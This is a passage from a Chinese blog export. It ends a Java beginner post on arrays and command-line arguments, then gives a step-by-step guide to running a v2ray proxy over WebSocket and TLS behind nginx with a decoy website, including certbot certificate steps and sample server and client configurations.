运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1tz6atxhj31f60u0dj5.jpg" alt="image.png"><h3 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h3>冒泡法可以对数组排序，但是鉴于本人对于数字的想象力有限，就不和冒泡法死磕了。java内置了排序方法<code>Arrays.sort()</code>可以帮助我们排序，前提也是要导入模块<code>java.util.Arrays</code>。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ns = &#123; <span class="number">28</span>, <span class="number">12</span>, <span class="number">89</span>, <span class="number">73</span>, <span class="number">65</span>, <span class="number">18</span>, <span class="number">96</span>, <span class="number">50</span>, <span class="number">8</span>, <span class="number">36</span> &#125;;</span><br><span class="line">        Arrays.sort(ns);</span><br><span class="line">        System.out.println(Arrays.toString(ns));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1tx0tki9j31f60u0wi1.jpg" alt="image.png"><br>对数组排序实际上修改了数组本身。<h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3>学会魔方之后，这个问题好像没有那么难了。一维数组的元素就相当于是一个方块，二维数组的元素就是一层魔方，三维数组的元素就是一整个魔方。这么说简单一点，一维数组的单位是块，二维数组的单位是层，三维数组的单位是个。</li>
</ul>
<ol>
<li>二维数组<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] ns = &#123;</span><br><span class="line">            &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> &#125;,</span><br><span class="line">            &#123; <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span> &#125;,</span><br><span class="line">            &#123; <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span> &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(ns.length); <span class="comment">// 3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1ubts3mvj31f60u0goz.jpg" alt="image.png"></li>
<li>三维数组<br>略……<h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3>这个命令行参数就是我们在命令行执行java程序时加的参数。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrintArgs</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;-version&quot;</span>.equals(arg)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;v 1.0&quot;</span>); <span class="comment">//这句代码的意思是如果用户输入的参数是-version，就打印输出v 1.0</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们到命令行，先编译这个java文件。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac .\PrintArgs.java</span><br></pre></td></tr></table></figure>
接下来执行程序时带上参数<code>-version</code>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS F:\java学习\HelloWorld\src&gt; java PrintArgs -version</span><br><span class="line">v 1.0</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>快速入门到这里就完成了。把知识先储备在这儿，用的时候不至于陌生。</li>
</ol>
]]></content>
      <categories>
        <category>java学习</category>
        <category>基础知识大漫灌</category>
      </categories>
      <tags>
        <tag>java编程</tag>
        <tag>快速入门</tag>
      </tags>
  </entry>
  <entry>
    <title>v2ray+ws+tls+web加固梯子</title>
    <url>//posts/ZH-CN/V2ray_Ws_Tls_Web.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>v2ray默认的vmess协议，流量特征太明显，容易被识别，安全性低。于是找了一个相对安全的方式：https。前提是手里有一个域名用来做伪装站点。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>nginx反向代理v2ray的websocket流量。</p>
<h3 id="nginx安装及配置"><a href="#nginx安装及配置" class="headerlink" title="nginx安装及配置"></a>nginx安装及配置</h3><h4 id="nginx安装"><a href="#nginx安装" class="headerlink" title="nginx安装"></a>nginx安装</h4><p><a href="https://www.myfreax.com/how-to-install-nginx-on-ubuntu-18-04/">参考文章</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# apt install nginx</span><br></pre></td></tr></table></figure>
<blockquote>
<p>查看nginx版本：<code>nginx -V</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gczg6drgpgj30pi08g3zr.jpg" alt="image.png"></p>
</blockquote>
<h4 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h4><p><a href="https://blog.csdn.net/w20101310/article/details/78835668">参考文章</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcy48l676ej30k10gjmyb.jpg" alt="image.png"><br>root@vultr:/etc/nginx/sites-enabled# ufw allow 8008<br>root@vultr:/etc/nginx/sites-enabled# nginx -s reload<br>root@vultr:/etc/nginx/sites-enabled# service nginx restart</p>
<blockquote>
<p>扩展：启动nginx遇到一个报错</p>
</blockquote>
<details><summary>点击展开报错信息</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@vultr:/etc/nginx/sites-enabled# service nginx status</span><br><span class="line">● nginx.service - A high performance web server and a reverse proxy server</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since Wed 2020-03-18 07:35:04 UTC; 4s ago</span><br><span class="line">     Docs: man:nginx(8)</span><br><span class="line">  Process: 17186 ExecStop=/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid (code=exi</span><br><span class="line">  Process: 17200 ExecStart=/usr/sbin/nginx -g daemon on; master_process on; (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 17189 ExecStartPre=/usr/sbin/nginx -t -q -g daemon on; master_process on; (code=exited, status=0/SUCCES</span><br><span class="line"> Main PID: 17204 (nginx)</span><br><span class="line">    Tasks: 2 (limit: 1108)</span><br><span class="line">   CGroup: /system.slice/nginx.service</span><br><span class="line">           ├─17204 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;</span><br><span class="line">           └─17207 nginx: worker process</span><br><span class="line"></span><br><span class="line">Mar 18 07:35:04 vultr.guest systemd[1]: Stopped A high performance web server and a reverse proxy server.</span><br><span class="line">Mar 18 07:35:04 vultr.guest systemd[1]: Starting A high performance web server and a reverse proxy server...</span><br><span class="line">Mar 18 07:35:04 vultr.guest systemd[1]: nginx.service: Failed to parse PID from file /run/nginx.pid: Invalid argum</span><br><span class="line">Mar 18 07:35:04 vultr.guest systemd[1]: Started A high performance web server and a reverse proxy server.</span><br></pre></td></tr></table></figure>

</p>
</details>

<p>解决方法：<br><a href="https://stackoverflow.com/questions/42078674/nginx-service-failed-to-read-pid-from-file-run-nginx-pid-invalid-argument">参考文章</a></p>
<details><summary>点击展开解决过程</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@vultr:/etc/nginx/sites-enabled# mkdir /etc/systemd/system/nginx.service.d</span><br><span class="line">root@vultr:/etc/nginx/sites-enabled# printf &quot;[Service]\nExecStartPost=/bin/sleep 0.1\n&quot; &gt; /etc/systemd/system/nginx.service.d/override.conf</span><br><span class="line">root@vultr:/etc/nginx/sites-enabled# systemctl daemon-reload</span><br><span class="line">root@vultr:/etc/nginx/sites-enabled# systemctl restart nginx</span><br><span class="line">root@vultr:/etc/nginx/sites-enabled# systemctl status nginx</span><br><span class="line">● nginx.service - A high performance web server and a reverse proxy server</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)</span><br><span class="line">  Drop-In: /etc/systemd/system/nginx.service.d</span><br><span class="line">           └─override.conf</span><br><span class="line">   Active: active (running) since Wed 2020-03-18 07:38:08 UTC; 18s ago</span><br><span class="line">     Docs: man:nginx(8)</span><br><span class="line">  Process: 17290 ExecStop=/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid (code=exi</span><br><span class="line">  Process: 17306 ExecStartPost=/bin/sleep 0.1 (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 17302 ExecStart=/usr/sbin/nginx -g daemon on; master_process on; (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 17293 ExecStartPre=/usr/sbin/nginx -t -q -g daemon on; master_process on; (code=exited, status=0/SUCCES</span><br><span class="line"> Main PID: 17305 (nginx)</span><br><span class="line">    Tasks: 2 (limit: 1108)</span><br><span class="line">   CGroup: /system.slice/nginx.service</span><br><span class="line">           ├─17305 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;</span><br><span class="line">           └─17310 nginx: worker process</span><br><span class="line"></span><br><span class="line">Mar 18 07:38:08 vultr.guest systemd[1]: Starting A high performance web server and a reverse proxy server...</span><br><span class="line">Mar 18 07:38:08 vultr.guest systemd[1]: Started A high performance web server and a reverse proxy server.</span><br></pre></td></tr></table></figure>

</p>
</details>

<p>已成功启动nginx，可输入IP+端口，进入nginx欢迎界面。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcy4izwvyfj31f60u0dif.jpg" alt="image.png"></p>
<h3 id="安装certbot获取https证书"><a href="#安装certbot获取https证书" class="headerlink" title="安装certbot获取https证书"></a>安装certbot获取https证书</h3><p><a href="https://blog.csdn.net/u012291393/article/details/78768547">参考文章</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:/etc/nginx/sites-available# apt install certbot</span><br></pre></td></tr></table></figure>
<p>申请https证书：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:/etc# certbot certonly --manual --preferred-challenge dns -d v2ray.dana5haw.com</span><br></pre></td></tr></table></figure>
<p>过程中，必须输入邮箱地址，并且允许IP log。<br>到这一步的时候，要去域名提供商那里设置DNS的TXT解析。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcy5x7ri8lj31eq0pyaer.jpg" alt="image.png"></p>
<details><summary>点击展开证书申请的关键过程</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NOTE: The IP of this machine will be publicly logged as having requested this</span><br><span class="line">certificate. If you&#x27;re running certbot in manual mode on a machine that is not</span><br><span class="line">your server, please ensure you&#x27;re okay with that.</span><br><span class="line"></span><br><span class="line">Are you OK with your IP being logged?</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(Y)es/(N)o: y</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Please deploy a DNS TXT record under the name</span><br><span class="line">_acme-challenge.v2ray.dana5haw.com with the following value:</span><br><span class="line"></span><br><span class="line">HnFJE7ZgBZYHI1FA-hEkz533GzkP9duc3Kg8TBYy4Sc</span><br><span class="line"></span><br><span class="line">Before continuing, verify the record is deployed.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br></pre></td></tr></table></figure>

</p>
</details>

<p>成功申请https证书，有效期90天。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcy60d0oy7j30ko089t9f.jpg" alt="image.png"><br>我用的这种申请证书的方式，<del>不能直接使用certbot自带的renew命令续期证书（因为我不打算开放80端口，certbot的renew功能续期证书需要服务器开放80端口）</del>。（这个有待验证，因为我现在可以使用这个命令<code>certbot renew</code>）</p>
<details><summary>点击展开查看renew详情</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@vultr:~# certbot renew</span><br><span class="line">Saving debug log to /var/log/letsencrypt/letsencrypt.log</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Processing /etc/letsencrypt/renewal/v2ray.dana5haw.com.conf</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Cert not yet due for renewal</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"></span><br><span class="line">The following certs are not due for renewal yet:</span><br><span class="line">  /etc/letsencrypt/live/v2ray.dana5haw.com/fullchain.pem expires on 2020-06-16 (skipped)</span><br><span class="line">No renewals were attempted.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br></pre></td></tr></table></figure>

</p>
</details>

<blockquote>
<p>扩展知识：查看证书有效期<br>输入命令<code>certbot certificates</code>即可查看证书有效期。</p>
</blockquote>
<details><summary>点击展开查看证书有效期</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@vultr:~# certbot certificates</span><br><span class="line">Saving debug log to /var/log/letsencrypt/letsencrypt.log</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Found the following certs:</span><br><span class="line">  Certificate Name: v2ray.dana5haw.com</span><br><span class="line">    Domains: v2ray.dana5haw.com</span><br><span class="line">    Expiry Date: 2020-06-16 07:24:17+00:00 (VALID: 89 days)</span><br><span class="line">    Certificate Path: /etc/letsencrypt/live/v2ray.dana5haw.com/fullchain.pem</span><br><span class="line">    Private Key Path: /etc/letsencrypt/live/v2ray.dana5haw.com/privkey.pem</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br></pre></td></tr></table></figure>

</p>
</details>

<h3 id="配置v2ray"><a href="#配置v2ray" class="headerlink" title="配置v2ray"></a>配置v2ray</h3><p>修改配置文件<code>config.json</code>，改为通过websocket传输流量。这个文件里，我们自定义websocket路径（最好是在<a href="https://pincong.rocks/url/link/aHR0cHM6Ly93d3cucmFuZG9tLm9yZy9zdHJpbmdzLz9udW09MSZsZW49NyZkaWdpdHM9b24mdXBwZXJhbHBoYT1vbiZsb3dlcmFscGhhPW9uJnVuaXF1ZT1vZmYmZm9ybWF0PWh0bWwmcm5kPW5ldw">这个网站</a>随机生成），以及websocket的端口号（我定义的端口号是4433）。</p>
<details><summary>点击展开配置文件内容</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;inbounds&quot;: [&#123;</span><br><span class="line">    &quot;port&quot;: 4433,</span><br><span class="line">    &quot;protocol&quot;: &quot;vmess&quot;,</span><br><span class="line">    &quot;listen&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">      &quot;clients&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;id&quot;: &quot;我的UUID&quot;,</span><br><span class="line">          &quot;level&quot;: 1,</span><br><span class="line">          &quot;alterId&quot;: 64</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;id&quot;: &quot;我的UUID&quot;,</span><br><span class="line">          &quot;level&quot;: 1,</span><br><span class="line">          &quot;alterId&quot;: 66</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;streamSettings&quot;: &#123;</span><br><span class="line">    &quot;network&quot;: &quot;ws&quot;,</span><br><span class="line">    &quot;wsSettings&quot;: &#123;&quot;path&quot;: &quot;/我的websocket路径&quot;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;outbounds&quot;: [&#123;</span><br><span class="line">    &quot;protocol&quot;: &quot;freedom&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;&#125;</span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    &quot;protocol&quot;: &quot;blackhole&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;&#125;,</span><br><span class="line">    &quot;tag&quot;: &quot;blocked&quot;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;routing&quot;: &#123;</span><br><span class="line">    &quot;rules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">        &quot;ip&quot;: [&quot;geoip:private&quot;],</span><br><span class="line">        &quot;outboundTag&quot;: &quot;blocked&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</p>
</details>

<h3 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h3><p>nginx要做这两件事：</p>
<ul>
<li>反向代理：将websocket流量转发给v2ray</li>
<li>制造伪装站点：不细说，总之就是假装自己是个正经网站</li>
</ul>
<p>配置文件位于<code>/etc/nginx/sites-enabled/default</code>。</p>
<details><summary>点击展开配置文件内容</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 8008 ssl default_server; #这是nginx监听端口</span><br><span class="line">        listen [::]:8008 ssl default_server;</span><br><span class="line"></span><br><span class="line">        ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK;</span><br><span class="line">        ssl_certificate /etc/letsencrypt/live/*/fullchain.pem; #这是我的https证书公钥文件</span><br><span class="line">        ssl_certificate_key /etc/letsencrypt/live/*/privkey.pem; #这是我的https证书私钥文件</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">        ssl_session_cache shared:SSL:60m;</span><br><span class="line">        ssl_session_timeout 1d;</span><br><span class="line">        ssl_session_tickets off;</span><br><span class="line"></span><br><span class="line">        ssl_stapling on;</span><br><span class="line">        ssl_stapling_verify on;</span><br><span class="line">        resolver 8.8.8.8 8.8.4.4 valid=300s;</span><br><span class="line">        resolver_timeout 10s;</span><br><span class="line"></span><br><span class="line">    # Security settings</span><br><span class="line">        if ($request_method  !~ ^(POST|GET)$) &#123; return 501; &#125;</span><br><span class="line">        add_header X-Frame-Options DENY;</span><br><span class="line">        add_header X-XSS-Protection &quot;1; mode=block&quot;;</span><br><span class="line">        add_header X-Content-Type-Options nosniff;</span><br><span class="line">        add_header Strict-Transport-Security max-age=31536000 always;</span><br><span class="line">        autoindex off;</span><br><span class="line">        server_tokens off;</span><br><span class="line">        charset utf-8;</span><br><span class="line"></span><br><span class="line">        root /var/www/html; #这是网站根目录，我们将网站模板都放到这个目录</span><br><span class="line"></span><br><span class="line">        # Add index.php to the list if you are using PHP</span><br><span class="line">        index index.html index.htm index.nginx-debian.html;</span><br><span class="line">        location ~ .*\.(js|jpg|JPG|jpeg|JPEG|css|bmp|gif|GIF|png)$ &#123; access_log off; &#125;</span><br><span class="line"></span><br><span class="line">        server_name *.*.com; #这是我的域名</span><br><span class="line"></span><br><span class="line">        location /我的websocket路径 &#123;</span><br><span class="line">                proxy_pass http://127.0.0.1:4433; #这是v2ray的端口</span><br><span class="line">                proxy_redirect off;</span><br><span class="line"></span><br><span class="line">                proxy_http_version 1.1;</span><br><span class="line">                proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">                proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">                proxy_set_header Host $host;</span><br><span class="line"></span><br><span class="line">                sendfile on;</span><br><span class="line">                tcp_nopush on;</span><br><span class="line">                tcp_nodelay on;</span><br><span class="line">                keepalive_requests 25600;</span><br><span class="line">                keepalive_timeout 300 300;</span><br><span class="line">                proxy_buffering off;</span><br><span class="line">                proxy_buffer_size 8k;</span><br><span class="line">                # First attempt to serve request as file, then</span><br><span class="line">                # as directory, then fall back to displaying a 404.</span><br><span class="line">                #try_files $uri $uri/ =404;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

</p>
</details>

<p>检查配置文件是否正确：<br><code>nginx -t</code></p>
<p>重载配置文件：<br><code>nginx -s reload</code></p>
<h3 id="上传网站模板"><a href="#上传网站模板" class="headerlink" title="上传网站模板"></a>上传网站模板</h3><p>在<a href="https://pincong.rocks/url/link/aHR0cHM6Ly9jb2xvcmxpYi5jb20vd3AvdGVtcGxhdGVzLw">这个网站</a>下载一个自己喜欢的网站模板（注意，我们用这个网站的模板，是因为这些模板都是全英文的，隐蔽性较强）<br>将下载下来的所有内容拷贝到网站根目录<code>/var/www/html</code>（我用的是mobaxterms的xftp功能来上传网站模板，mobaxterms作为一款远程连接工具确实好用）。</p>
<h3 id="重启nginx和v2ray"><a href="#重启nginx和v2ray" class="headerlink" title="重启nginx和v2ray"></a>重启nginx和v2ray</h3><p><strong>注意：</strong>以上所有操作的前提是，我已经把防火墙关了，并且开启了ssh服务。（为了方便远程连接服务器进行这些软件的安装和配置）<br>重启nginx和v2ray：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br><span class="line">systemctl restart v2ray</span><br></pre></td></tr></table></figure>
<h3 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下~"></a>测试一下~</h3><p>测试就看两点：</p>
<ul>
<li>伪装网站能否正常打开</li>
<li>PC和手机能否正常使用v2ray</li>
</ul>
<p>伪装网站可以正常打开：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcyam1g28nj31f60u0u0x.jpg" alt="image.png"></p>
<h4 id="PC端配置文件更改"><a href="#PC端配置文件更改" class="headerlink" title="PC端配置文件更改"></a>PC端配置文件更改</h4><p>PC端的配置文件<code>config.json</code>改成这样：<br><strong>要点</strong>：</p>
<ul>
<li>通信过程：用户——(udp协议、<strong>websocket通信</strong>)——&gt;v2ray客户端——(tcp协议、tls加密、<strong>websocket通信</strong>)——&gt;nginx反向代理——(tcp协议、<strong>websocket通信</strong>)——&gt;v2ray服务端——(any)——&gt;目标访问网站</li>
<li>v2ray客户端的inbound是用户，outbound是v2ray服务端</li>
<li>v2ray服务端的inbound是v2ray客户端，outbound是目标访问网站</li>
<li>用户访问v2ray客户端使用udp协议，网络访问速度会更快，尤其是看YTB视频更流畅。（视频播放这种应用场景，更适合用udp协议）<a href="https://github.com/v2ray/discussion/issues/513">参考</a></li>
<li>开启MUX功能，即多路复用，增加了并发连接数</li>
</ul>
<details><summary>点击展开配置文件内容</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;inbounds&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;port&quot;: 1080,</span><br><span class="line">      &quot;listen&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">      &quot;protocol&quot;: &quot;socks&quot;,</span><br><span class="line">      &quot;sniffing&quot;: &#123;</span><br><span class="line">        &quot;enabled&quot;: true,</span><br><span class="line">        &quot;destOverride&quot;: [&quot;http&quot;, &quot;tls&quot;]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;auth&quot;: &quot;noauth&quot;,</span><br><span class="line">        &quot;udp&quot;: true //开启UDP</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;outbounds&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;tag&quot;: &quot;proxy-vmess&quot;,</span><br><span class="line">      &quot;protocol&quot;: &quot;vmess&quot;,</span><br><span class="line">      &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;vnext&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;address&quot;: &quot;我的域名&quot;, // 服务器的 IP</span><br><span class="line">            &quot;port&quot;: 8008, // 服务器的端口</span><br><span class="line">            &quot;users&quot;: [</span><br><span class="line">              &#123;</span><br><span class="line">                // id 就是 UUID，相当于用户密码</span><br><span class="line">                &quot;id&quot;: &quot;我的UUID&quot;,</span><br><span class="line">                &quot;alterId&quot;: 4</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;streamSettings&quot;: &#123;</span><br><span class="line">        &quot;network&quot;: &quot;ws&quot;,</span><br><span class="line">        &quot;security&quot;: &quot;tls&quot;,</span><br><span class="line">        &quot;wsSettings&quot;: &#123;</span><br><span class="line">          &quot;path&quot;: &quot;/我的websocket路径&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;mux&quot;: &#123;</span><br><span class="line">        &quot;enabled&quot;: true, //开启多路复用</span><br><span class="line">        &quot;concurrency&quot;: 8</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;tag&quot;: &quot;direct&quot;,</span><br><span class="line">      &quot;settings&quot;: &#123;&#125;,</span><br><span class="line">      &quot;protocol&quot;: &quot;freedom&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;dns&quot;: &#123;</span><br><span class="line">    &quot;server&quot;: [</span><br><span class="line">      &quot;8.8.8.8&quot;,</span><br><span class="line">      &quot;1.1.1.1&quot;</span><br><span class="line">    ],</span><br><span class="line">    // 你的 IP 地址，用于 DNS 解析离你最快的 CDN</span><br><span class="line">    &quot;clientIp&quot;: &quot;203.208.40.63&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  // 配置路由功能，绕过局域网和中国大陆地址</span><br><span class="line">  &quot;routing&quot;: &#123;</span><br><span class="line">    &quot;domainStrategy&quot;: &quot;IPOnDemand&quot;,</span><br><span class="line">    &quot;rules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">        &quot;domain&quot;: [</span><br><span class="line">          // 默认跳过国内网站，如果想要代理某个国内网站可以添加到下列列表中</span><br><span class="line">          &quot;github.com&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;outboundTag&quot;: &quot;proxy-vmess&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">        &quot;domain&quot;: [</span><br><span class="line">          &quot;geosite:cn&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;outboundTag&quot;: &quot;direct&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">        &quot;outboundTag&quot;: &quot;direct&quot;,</span><br><span class="line">        &quot;ip&quot;: [</span><br><span class="line">          &quot;geoip:cn&quot;,</span><br><span class="line">          &quot;geoip:private&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</p>
</details>

<p>开启软件，打开浏览器代理即可使用。（浏览器的代理配置和之前一样，用SOCKS5代理，代理端口是1080）</p>
<h4 id="手机端的配置更改"><a href="#手机端的配置更改" class="headerlink" title="手机端的配置更改"></a>手机端的配置更改</h4><p>参考<a href="https://www.shawnlin.cn/v2ray-client/#%E4%BB%A5BifrostV%E9%85%8D%E7%BD%AE%E4%B8%BA%E4%BE%8B">这篇文章</a><br>配置简单，照着这个教程配置就可以正常上网了。<br><strong>新增</strong>：直接把配置文件导入手机端就行了，这样的配置更精细化，网络访问速度更快。</p>
